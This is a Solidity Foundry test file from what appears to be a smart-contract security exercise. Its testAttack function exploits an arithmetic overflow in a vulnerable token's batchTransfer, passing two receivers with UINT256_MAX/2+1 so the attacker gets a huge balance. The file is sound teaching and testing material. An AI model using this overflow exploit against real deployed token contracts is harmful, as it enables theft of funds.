// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import {PumpMeToken} from "../../src/4. Arithmetic Overflows-4/PumpMeToken.sol";
// import {PumpMeToken} from "../../src/4. Arithmetic Overflows-4/Solution/PumpMeTokenSecured.sol";

contract TestPumpMeToken is Test {
    PumpMeToken token;

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    uint256 constant INITIAL_SUPPLY = 1000000;

    function setUp() public {
        vm.prank(deployer);
        token = new PumpMeToken(INITIAL_SUPPLY);

        assertEq(token.balanceOf(deployer), INITIAL_SUPPLY);
        assertEq(token.balanceOf(attacker), 0);
    }

    function testAttack() public {
        address[] memory receivers = new address[](2);
        receivers[0] = attacker;
        receivers[1] = deployer;

        uint256 amount = UINT256_MAX / 2 + 1;

        vm.prank(attacker);
        token.batchTransfer(receivers, amount);

        // Attacker should have a lot of tokens (at least more than 1 million)
        assertGt(token.balanceOf(attacker), INITIAL_SUPPLY);
    }
}
